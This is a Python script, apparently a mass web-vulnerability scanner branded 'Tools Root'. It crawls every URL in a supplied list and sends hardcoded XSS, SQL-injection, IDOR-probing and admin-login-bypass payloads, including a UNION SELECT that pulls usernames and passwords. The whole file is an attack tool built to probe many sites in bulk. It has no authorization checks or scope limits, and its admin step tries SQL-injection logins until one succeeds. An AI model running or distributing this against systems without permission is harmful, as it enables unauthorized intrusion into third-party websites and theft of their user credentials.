import requests
from bs4 import BeautifulSoup
import pandas as pd
from colorama import Fore, init
from tqdm import tqdm
import pyfiglet

init(autoreset=True)

# Payloads for vulnerabilities
xss_payloads = ["<script>alert('XSS')</script>", "<img src='x' onerror='alert(1)'>", "<body onload=alert('XSS')>"]
sql_payloads = ["' OR 1=1 --", "' AND 1=2 UNION SELECT NULL,NULL --", "' UNION SELECT username, password FROM users --"]
idor_user_ids = [1, 2, 999, 1000]
bypass_payloads = [
    {"username": "' OR 1=1 --", "password": "any"},
    {"username": "admin", "password": "' OR '1'='1"},
    {"username": "root", "password": "' UNION SELECT 1,2,3 --"}
]

# Parameters to test
test_parameters = ["id", "user", "page", "search", "query", "product"]

# Crawl website for endpoints
def crawl_website(base_url):
    visited = set()
    endpoints = set()
    try:
        response = requests.get(base_url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        for link in soup.find_all('a', href=True):
            href = link['href']
            if href.startswith('/'):
                full_url = base_url.rstrip('/') + href
                if full_url not in visited:
                    visited.add(full_url)
                    endpoints.add(full_url)
            elif base_url in href:
                if href not in visited:
                    visited.add(href)
                    endpoints.add(href)
    except requests.exceptions.RequestException:
        pass
    return endpoints

# Vulnerability scan functions
def scan_xss(url):
    results = []
    for param in test_parameters:
        for payload in xss_payloads:
            try:
                response = requests.get(url, params={param: payload}, timeout=10)
                if payload in response.text:
                    results.append({"Path": url, "Parameter": param, "Payload": payload})
            except requests.exceptions.RequestException:
                continue
    return results

def scan_sql_injection(url):
    results = []
    for param in test_parameters:
        for payload in sql_payloads:
            try:
                response = requests.get(url, params={param: payload}, timeout=10)
                if "syntax" in response.text.lower() or "mysql" in response.text.lower() or "error" in response.text.lower():
                    results.append({"Path": url, "Parameter": param, "Payload": payload})
            except requests.exceptions.RequestException:
                continue
    return results

def scan_idor(url):
    results = []
    for user_id in idor_user_ids:
        path = f"{url}/{user_id}"
        try:
            response = requests.get(path, timeout=10)
            if response.status_code == 200 and "user" in response.text.lower():
                results.append({"Path": path, "Payload": f"User ID: {user_id}"})
        except requests.exceptions.RequestException:
            continue
    return results

def bypass_admin_panel(admin_url):
    results = []
    for payload in bypass_payloads:
        try:
            response = requests.post(admin_url, data=payload, timeout=10)
            if "dashboard" in response.text.lower() or "welcome" in response.text.lower():
                results.append({"Path": admin_url, "Payload": payload})
                break
        except requests.exceptions.RequestException:
            continue
    return results

# Main scan function
def scan_site(base_url):
    endpoints = crawl_website(base_url)
    vulnerabilities = {"XSS": [], "SQL Injection": [], "IDOR": [], "Admin Bypass": []}

    for endpoint in tqdm(endpoints, desc=f"Scanning {base_url}", ncols=100):
        # XSS Scan
        vulnerabilities["XSS"].extend(scan_xss(endpoint))
        # SQL Injection Scan
        vulnerabilities["SQL Injection"].extend(scan_sql_injection(endpoint))
        # IDOR Scan
        vulnerabilities["IDOR"].extend(scan_idor(endpoint))

    # Admin Bypass
    admin_results = bypass_admin_panel(f"{base_url}/admin")
    if admin_results:
        vulnerabilities["Admin Bypass"].extend(admin_results)

    return vulnerabilities

# Display results in separate tables
def display_results(all_results):
    for vuln_type, results in all_results.items():
        if results:
            print(Fore.GREEN + f"\nResults for {vuln_type}:")
            df = pd.DataFrame(results)
            print(Fore.GREEN + df.to_string(index=False))
        else:
            print(Fore.RED + f"\nNo {vuln_type} vulnerabilities detected.")

# Entry point
def main():
    print(Fore.CYAN + pyfiglet.figlet_format("Tools Root", font="slant"))
    filename = input(Fore.CYAN + "Enter the file containing URLs (e.g., list.txt): ")

    if not filename or not filename.endswith('.txt'):
        print(Fore.RED + "Invalid file format. Please provide a .txt file.")
        return

    try:
        with open(filename, 'r') as file:
            urls = [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        print(Fore.RED + f"File '{filename}' not found.")
        return

    all_vulnerabilities = {"XSS": [], "SQL Injection": [], "IDOR": [], "Admin Bypass": []}

    for base_url in urls:
        site_results = scan_site(base_url)
        for vuln_type, results in site_results.items():
            all_vulnerabilities[vuln_type].extend(results)

    print(Fore.CYAN + "\nScan completed. Results:")
    display_results(all_vulnerabilities)

if __name__ == "__main__":
    main()
